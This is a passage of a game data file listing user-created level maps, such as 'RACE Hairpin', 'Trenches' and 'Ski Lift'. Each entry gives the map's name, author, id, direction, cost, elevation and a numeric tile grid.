up",author="chinny",id="#1669067938",direction="right",cost=117,elevation=17,map=[5,2,2,5,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,6,7,7,6,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,8,8,7,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,9,9,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,8,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,9,10,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,11,11,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,11,12,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,12,12,12,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,12,12,13,13,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,13,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,13,14,14,14,15,15,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,15,15,16,16,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,15,15,16,16,17,17,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,16,16,17,17,18,18,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,17,17,18,18,19,19,20,21,21,0,0,0,0,0,0,0,0,0,0,0,0,17,18,19,19,19,20,21,22,22,23,24,24,0,0,0,0,0,0,0,0,0,0,19,19,20,20,21,22,23,24,24,2,0,0,0,0,0,0,0,0,0,0,0,0,20,20,21,22,23,24,24,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,22,23,23,24,24]});
maps.push({name="RACE Hairpin",author="ZpLit",id="#1669075268",direction="right",cost=96,elevation=0,map=[0,0,0,0,0,0,0,0,0,14,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,0,14,14,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,14,14,2,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,0,14,14,2,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,0,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,1,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Delfino Arc",author="ZpLit",id="#1669075919",direction="right",cost=200,elevation=0,map=[0,0,0,0,0,0,0,0,0,0,0,14,14,14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,35,35,35,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,34,34,34,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,14,14,14,16,16,16,14,14,16,16,16,16,16,16,16,16,16,0,0,0,14,14,14,16,0,0,14,14,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,16,0,14,14,14,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,16,0,0,14,14,14,0,0,0,0,14,14,14,14,14,2,0,14,14,14,14,16,0,0,14,14,0,0,0,14,14,14,14,14,14,2,0,14,14,14,14,14,16,16,14,14,0,0,14,14,14,14,14,14,14,14,0,0,14,14,14,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0]});
maps.push({name="RACE Tick Tock Clock",author="ZpLit",id="#1669137716",direction="right",cost=116,elevation=4,map=[14,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,18,18,18,2,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,18,18,18,18,2,14,14,14,14,0,0,0,0,0,0,0,0,0,0,18,18,18,18,18,18,14,14,14,14,14,15,16,17,18,19,19,18,18,18,18,18,18,18,18,0,14,14,14,14,14,9998,14,14,15,16,17,18,18,18,18,18,18,18,0,0,14,14,14,14,14,9998,14,14,15,16,17,18,18,18,18,18,18,0,0,0,0,14,14,14,14,9998,14,14,15,16,17,18,18,18,18,18,0,0,0,0,0,0,14,14,14,15,16,17,18,19,19,18,18,18,18,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="RACE Bowser Castle 2",author="ZpLit",id="#1669167018",direction="forward",cost=200,elevation=0,map=[0,0,0,0,0,0,0,0,14,2,2,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,76,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,76,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,76,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,76,14,14,76,76,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,76,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,76,76,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,76,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,76,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,76,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,76,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,76,14,14,76,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,76,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,14,14,14,14,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,14,2,2,14,14,0,0,0,0,0,0,0]});
maps.push({name="trenches",author="Headhunterz",id="#1669247389",direction="forward",cost=238,elevation=0,map=[0,0,0,0,1,1,1,1,1,2,2,1,1,1,1,1,0,0,0,0,0,0,0,0,1,94,94,8,8,8,8,8,8,94,94,1,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,0,0,0,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,0,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,0,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,0,0,0,0,7,186,0,0,1,8,8,8,8,8,8,8,8,8,8,1,0,0,0,0,153,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,157,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,155,0,0,0,1,7,7,7,7,7,7,7,7,7,7,1,0,0,0,0,154,0,0,0,1,8,8,8,8,8,8,8,8,8,8,1,0,0,0,0,8,186,0,0,1,93,93,93,8,88,8,8,93,93,93,1,0,0,0,0,0,0,0,0,1,1,1,1,1,8,8,1,1,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,1,2,2,1,0,0,0,0,0,0,0,0]});
maps.push({name="real 280lj",author="Headhunterz",id="#1669248538",direction="forward",cost=175,elevation=0,map=[0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,10,10,0,0,0,0,0,0,0,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,10,10,1,1,0,0,0,10,10,0,0,0,1,1,183,183,0,0,0,0,10,10,1,0,0,0,0,10,10,0,0,0,0,1,183,183,0,0,0,0,10,10,0,0,0,0,0,10,10,0,0,0,0,0,183,183,0,0,0,0,96,96,0,0,0,0,0,10,10,0,0,0,0,0,183,183,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,96,96,0,0,0,0,0,0,0,0,0,0,0,0,183,183,0,0,0,0,96,96,0,0,0,0,0,10,10,0,0,0,0,0,183,183,0,0,0,0,96,96,0,0,0,0,0,93,93,0,0,0,0,0,183,183,0,0,0,0,10,10,0,0,0,0,0,93,93,0,0,0,0,0,183,183,0,0,0,0,10,10,1,0,0,0,0,10,10,0,0,0,0,1,183,183,0,0,0,0,10,10,1,1,0,0,0,10,10,0,0,0,1,1,183,183,0,0,0,0,10,10,10,10,10,10,10,97,10,10,10,10,10,10,10,10,0,0,0,0,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,10,0,0,0,0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0]});
maps.push({name="Its over anakin",author="Luffaren",id="#1669257253",direction="right",cost=271,elevation=0,map=[9,2,2,9,90,9,9,9,9,9,9998,77,9998,9,9,9,94,1,0,0,9,9,9,9,9,9,9,9,89,90,9,29,9,89,9,9,91,94,1,0,9,9,9,9,9,94,90,9,9,7,7,0,7,7,8,1,90,9,94,1,1,8,8,9,9,9,8,8,7,7,6,0,6,7,7,1,1,9,91,1,7,7,7,9,9,7,7,7,7,6,6,0,6,6,7,7,1,1,96,90,0,6,6,8,8,6,6,6,6,6,5,0,5,6,1,1,1,7,9,9,1,0,5,8,8,5,5,5,5,5,5,0,5,1,1,6,6,7,7,9,0,1,0,28,28,0,0,0,0,0,0,77,34,1,5,5,6,6,7,8,0,0,0,0,28,0,0,0,0,0,0,0,77,34,0,5,5,6,7,8,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,6,7,8,8,151,0,0,0,0,0,0,0,0,0,0,0,0,0,187,8,6,7,89,188,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,27,77,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,7,7,9998,187,6,153,187,8,93,0,0,0,0,8,0,0,0,5,6,6,7,9,9,0,154,157,0,0,0,0,0,0,0,29,0,0,0,5,6,7,7,9,97,0,0,0,0,0,0,0,0,0,0,0,0,0,0,5,6,7,8,89,9,0,77,0,0,0,0,24,77,0,0,0,0,0,0,5,5,7,8,9,2,0,19,77,0,0,0,24,9998,93,29,0,0,0,0,0,5,5,8,9,2,19,19,19,0,0,0,0,24,77,188,0,0,77,0,0,0,5,5,9,9,77,19,19,19,77,0,0,0,0,187,29,93,14,77,0,0,0,5,5,8]});
maps.push({name="Bug",author="Headhunterz",id="#1669257484",direction="forward",cost=140,elevation=0,map=[0,0,0,0,0,0,0,0,2,2,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,11,11,11,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,11,11,0,0,0,11,11,0,0,0,0,0,0,0,0,0,0,0,0,0,96,96,0,0,0,11,11,0,0,0,0,0,1,1,1,1,1,1,1,0,96,96,0,0,0,11,11,0,0,0,0,0,1,18,135,0,0,0,114,0,11,11,0,0,0,0,0,0,0,0,0,0,1,18,135,0,0,0,114,0,11,11,0,0,0,0,135,15,0,151,18,0,1,18,135,0,0,0,114,0,11,11,0,0,0,0,0,16,0,0,16,0,1,18,18,0,0,0,114,0,11,11,0,0,0,0,0,16,0,0,16,0,1,18,18,0,0,0,114,0,11,11,0,0,0,0,0,16,16,16,16,0,1,94,18,0,0,0,114,0,11,11,0,0,0,0,0,0,0,0,0,0,1,93,18,0,0,0,114,0,11,11,0,0,0,0,0,0,0,0,0,0,1,93,18,0,0,0,114,0,11,11,0,0,0,0,0,0,0,0,0,0,1,93,18,0,0,97,114,0,11,11,0,0,0,0,0,0,0,0,0,0,1,94,18,0,0,114,114,0,11,11,0,0,0,0,0,0,0,0,0,0,1,1,1,1,1,1,1,0,2,2,0,0,0,0,0,0,0,0,0,0]});
maps.push({name="Air Hockey",author="sivi",id="#1669310026",direction="forward",cost=494,elevation=0,map=[0,0,0,1,1,1,1,1,1,2,2,1,1,1,1,1,1,0,0,0,0,0,0,1,94,93,1,1,90,114,114,90,1,1,93,94,1,0,0,0,0,0,1,1,114,114,1,1,114,114,114,114,1,1,114,114,1,1,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,170,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,173,0,0,15,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,15,0,0,176,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,174,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,15,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,15,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,175,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,1,135,135,135,135,135,135,135,135,135,135,135,135,135,135,1,0,0,0,0,1,1,114,114,1,199,199,199,199,199,199,1,114,114,1,1,0,0,0,0,0,1,114,114,114,114,114,114,114,114,114,114,114,114,1,0,0,0,0,0,0,1,90,114,114,114,114,114,114,114,114,114,114,90,1,0,0,0,0,0,0,1,1,90,114,114,114,114,114,114,114,114,90,1,1,0,172,0,0,0,0,0,1,1,1,1,1,2,2,1,1,1,1,1,0,0,0,0]});
maps.push({name="Sky Tunnel",author="sivi",id="#1669330061",direction="right",cost=245,elevation=0,map=[0,0,11,45,2,2,9998,11,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,45,45,11,0,0,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,0,0,11,45,45,45,11,0,0,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,0,0,0,0,0,0,0,0,0,0,0,145,45,199,183,183,183,199,45,145,145,145,0,145,145,145,0,145,145,145,145,0,0,11,45,45,45,11,0,45,45,45,0,45,45,45,0,45,45,45,11,145,45,199,183,183,183,11,11,199,199,199,11,199,199,199,11,199,199,199,9998,145,45,199,183,183,183,183,45,183,183,183,45,183,183,183,45,183,183,183,2,145,45,199,183,183,183,183,45,183,183,183,45,183,183,183,45,183,183,183,2,145,45,199,183,183,183,183,45,183,183,183,45,183,183,183,45,183,183,183,45,0,0,11,199,199,199,199,11,199,199,199,11,199,199,199,11,199,199,199,11,0,0,0,45,45,45,45,0,45,45,45,0,45,45,45,0,45,45,45,0,0,0,0,145,145,145,145,0,145,145,145,0,145,145,145,0,145,145,145,0]});
maps.push({name="Go with the flow",author="Luffaren",id="#1669411439",direction="forward",cost=272,elevation=-9,map=[0,14,2,2,14,0,0,0,0,0,0,24,129,0,0,0,0,24,89,1,0,14,14,14,14,0,0,0,0,0,0,24,129,0,0,0,0,24,24,1,0,14,14,14,14,0,0,0,0,0,0,24,24,0,0,0,0,127,127,1,0,14,127,127,14,0,0,0,0,0,77,24,89,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24,89,1,1,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,77,24,24,1,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,24,24,1,0,0,0,0,0,0,0,19,19,19,19,0,0,0,0,0,0,0,0,1,0,0,65,65,65,65,0,19,19,19,19,0,24,93,24,0,0,0,0,1,0,0,65,65,65,65,0,19,127,127,19,0,94,24,94,0,0,0,0,1,67,0,65,65,65,65,0,0,0,0,0,0,24,93,24,0,0,0,0,1,67,0,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,0,0,1,67,0,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,126,126,1,67,0,65,65,65,65,0,0,0,0,0,0,0,0,0,0,0,24,24,1,67,0,65,65,65,65,0,24,24,24,24,129,0,0,0,24,24,89,24,1,67,0,65,65,65,65,0,24,24,24,24,129,0,0,0,24,24,24,24,1,67,0,65,65,65,65,0,24,24,24,24,129,0,0,0,24,24,24,24,1,0,0,5,5,5,5,0,0,0,0,0,1,1,1,1,1,1,1,1,1,0,0,5,2,2,5]});
maps.push({name="Ikea Factory",author="sivi",id="#1669411822",direction="forward",cost=348,elevation=0,map=[1,1,1,1,1,1,1,1,1,2,2,1,1,1,1,1,1,1,1,1,1,1,1,1,1,114,114,114,114,114,114,114,114,114,114,1,1,1,1,1,1,121,77,0,199,114,90,114,114,114,114,90,114,114,114,199,0,77,121,1,1,121,77,0,199,114,114,114,90,114,114,114,114,90,114,199,0,77,121,1,1,1,1,1,1,114,114,114,114,114,114,114,114,114,114,1,1,1,1,1,1,0,77,0,111,0,0,0,0,0,0,0,0,0,0,111,0,77,0,1,1,0,173,0,9998,174,0,0,175,0,0,176,0,0,177,9998,0,178,0,1,1,189,0,0,111,0,0,0,0,0,0,0,0,0,0,111,0,0,189,1,1,16,0,0,1,114,114,114,114,114,114,114,114,114,114,1,0,0,16,1,1,93,0,0,199,114,114,114,90,114,114,114,114,90,114,199,0,0,94,1,1,93,0,0,199,114,90,114,114,114,114,90,114,114,114,199,0,0,94,1,1,16,0,0,1,114,114,114,114,114,114,114,114,114,114,1,0,0,16,1,1,188,0,0,111,0,0,0,0,0,0,0,0,0,0,111,0,0,188,1,1,0,191,0,9998,190,169,169,182,0,0,181,169,169,180,9998,0,179,169,1,1,0,77,0,111,0,0,0,0,0,0,0,0,0,0,111,0,77,0,1,1,1,1,1,1,114,114,114,114,114,114,114,114,114,114,1,1,1,1,1,1,121,77,0,199,114,90,114,114,114,114,114,90,114,114,199,0,77,121,1,1,121,77,0,199,114,114,114,114,90,114,114,114,114,114,199,0,77,121,1,1,1,1,1,1,114,88,114,114,114,114,114,114,88,114,1,1,1,1,1,0,0,0,0,1,1,1,1,1,2,2,1,1,1,1,1,153,13,154,157]});
maps.push({name="Ski Lift",author="sivi",id="#1669426429",direction="forward",cost=228,elevation=11,map=[0,0,1,1,1,1,1,105,105,2,2,105,105,105,1,1,1,1,1,0,0,0,1,93,0,0,0,45,45,45,11,45,45,45,0,0,0,93,1,0,0,0,1,108,67,0,0,0,191,0,32,0,173,0,0,0,67,108,1,0,0,0,1,0,0,0,187,5,190,169,33,169,174,5,186,0,0,0,1,0,0,0,1,3,0,0,0,0,0,0,34,0,0,0,0,0,0,3,1,0,0,0,1,0,0,0,0,35,35,35,15,35,35,35,0,0,0,0,1,0,0,0,1,112,67,0,0,0,0,0,36,0,0,0,0,0,67,112,1,0,0,0,1,0,0,0,187,8,182,169,37,169,175,8,186,0,0,0,1,0,0,0,1,3,0,0,0,0,0,0,38,0,0,0,0,0,0,3,1,0,0,0,1,0,0,0,0,39,39,39,19,39,39,39,0,0,0,0,1,0,0,0,1,116,67,0,0,0,0,0,40,0,0,0,0,0,67,116,1,0,0,0,1,0,0,0,187,12,181,169,41,169,176,12,186,0,0,0,1,0,0,0,1,3,0,0,0,0,0,0,42,0,0,0,0,0,0,3,1,0,0,0,1,0,0,0,0,43,43,43,23,43,43,43,0,0,0,0,1,0,0,0,1,120,67,0,0,0,0,0,44,0,0,0,0,0,67,120,1,0,0,0,1,0,0,0,187,16,180,169,44,169,177,16,186,0,0,0,1,0,0,0,1,3,0,0,0,0,179,0,44,0,178,0,0,0,0,3,1,0,0,0,1,0,0,0,0,185,185,185,24,185,185,185,0,0,0,0,1,0,0,0,1,124,67,0,0,16,16,16,16,16,16,16,0,0,67,124,1,0,0,0,1,1,1,1,1,116,116,2,2,116,116,116,1,1,1,1,1,0]});
maps.push({name="Puller Is Aggressive",author="ZpLit",id="#1669434181",direction="forward",cost=152,elevation=0,map=[94,32,0,0,0,36,0,34,14,2,2,14,34,0,36,0,0,0,32,94,94,32,0,0,0,36,0,34,14,14,14,14,34,0,36,0,0,0,32,94,0,0,0,0,0,0,0,0,0,0,0,34,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,34,0,0,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,199,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,0,0,34,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,199,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,34,0,0,95,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,199,199,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,95,95,0,0,34,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,199,199,0,0,95,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,0,0,0,129,0,0,0,0,0,0,0,0,0,95,1,0,0,0,0,0,128,0,93,32,0,0,0,36,0,34,14,14,14,14,34,0,36,0,0,0,32,93,93,32,0,0,0,36,0,34,14,2,2,14,34,0,36,0,0,0,32,93]});
maps.push({name="Over The Top",author="ZpLit",id="#1669434658",direction="forward",cost=171,elevation=6,map=[0,0,0,0,0,0,66,94,94,66,66,2,2,66,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,66,66,66,66,66,66,66,66,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,8,90,87,8,8,90,87,90,0,0,0,0,0,0,0,0,0,0,0,0,87,8,8,90,8,87,8,8,0,0,0,0,0,0,0,0,0,0,0,0,90,8,8,87,90,8,90,87,0,0,0,0,0,0,0,0,0,0,0,0,8,87,90,8,8,87,8,90,0,0,0,0,0,0,0,0,0,0,0,0,8,8,8,8,8,8,8,8,0,0,0,0,0,0,0,0,0,0,0,0,9,9,9,9,9,9,9,9,0,0,0,0,0,0,0,0,0,0,0,0,7,7,7,7,7,7,7,7,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,27,27,0,0,27,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,28,28,0,0,27,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,29,29,0,0,27,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,30,30,0,0,27,0,0,0,0,0,0,0,0,0,0,0,0,7,0,0,31,31,0,0,27,0,0,0,0,0,0,0,0,0,0,0,0,3,0,0,32,32,0,31,29,0,0,0,0,0,0,0,0,0,0,0,18,13,93,87,13,13,87,93,13,18,0,0,0,0,0,0,0,0,0,0,18,13,13,88,2,2,88,13,13,18,0,0,0,0,0]});
maps.push({name="Divide And Perish",author="ZpLit",id="#1669435416",direction="forward",cost=308,elevation=-12,map=[0,0,0,0,0,0,0,1,124,2,2,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,124,124,124,124,1,0,0,0,0,0,0,0,0,0,0,0,0,1,1,1,124,124,124,124,1,1,1,0,0,0,0,0,0,0,0,0,1,124,124,124,124,124,124,124,124,124,124,1,0,0,0,0,0,0,0,0,1,124,97,124,124,124,124,124,124,97,124,1,0,0,0,0,0,0,0,0,1,124,124,124,124,195,195,124,124,124,124,1,0,0,0,0,0,0,1,1,1,124,124,124,1,89,124,1,124,124,124,1,1,1,0,0,0,1,65,65,65,124,124,124,1,124,89,1,124,124,124,65,65,65,1,0,0,1,65,65,65,124,124,124,1,89,124,1,124,124,124,65,65,65,1,0,0,1,65,65,65,124,124,94,1,124,89,1,94,124,124,65,65,65,1,0,0,1,119,119,119,1,1,1,1,89,124,1,1,1,1,119,119,119,1,0,0,1,119,119,119,1,0,0,1,124,89,1,0,0,1,119,119,119,1,0,0,1,119,119,119,1,0,0,1,89,124,1,0,0,1,119,119,119,1,0,0,1,119,119,119,1,0,0,1,124,89,1,0,0,1,119,119,119,1,0,0,1,119,119,119,1,0,0,1,124,124,1,0,0,1,119,119,119,1,0,0,1,119,119,119,1,1,1,1,93,93,1,1,1,1,119,119,119,1,0,0,1,119,100,119,119,119,119,65,65,65,65,119,119,119,119,100,119,1,0,0,1,119,119,119,119,119,119,12,12,12,12,119,119,119,119,119,119,1,0,0,0,1,1,1,1,1,1,88,2,2,88,1,1,1,1,1,1,0,0]});
maps.push({name="RACE Monaco Chicane",author="ZpLit",id="#1669436600",direction="right",cost=189,elevation=0,map=[0,2,2,14,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,1,14,14,14,1,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,185,19,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,19,185,185,185,14,19,0,0,0,0,0,0,0,0,0,0,14,14,0,0,19,185,185,14,185,